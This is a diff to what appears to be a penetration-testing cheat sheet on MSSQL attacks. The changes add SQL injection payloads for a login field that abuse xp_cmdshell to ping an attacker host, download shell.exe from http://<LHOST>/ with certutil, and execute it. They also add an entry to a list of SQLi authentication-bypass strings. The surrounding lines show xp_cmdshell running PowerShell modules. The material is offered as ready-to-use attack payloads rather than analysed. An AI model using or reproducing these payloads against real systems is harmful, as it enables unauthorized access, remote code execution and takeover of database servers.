@@ -410,6 +410,14 @@ SQL> xp_cmdshell powershell -c import-module C:\PATH\TO\FILE\<FILE>.ps1; <FILE> 
 SQL> xp_cmdshell "powershell $cred = New-Object System.Management.Automation.PSCredential(\"<USERNAME>\",\"<PASSWORD>\");Import-Module C:\PATH\TO\FILE\<FILE>.ps1;<FILE> <OPTIONS>
 ```
 
+#### MSSQL SQL Injection (SQLi) to Remote Code Execution (RCE) on a Logon Field
+
+```c
+';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
+';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
+';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
+```
+
 #### MSSQL SQL Injection (SQLi) to Remote Code Execution (RCE) in URL
 
 ```c
@@ -624,6 +632,7 @@ $ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 ### Master List
 
 ```c
+';#---
 admin' or '1'='1
 ' or '1'='1
 " or "1"="1
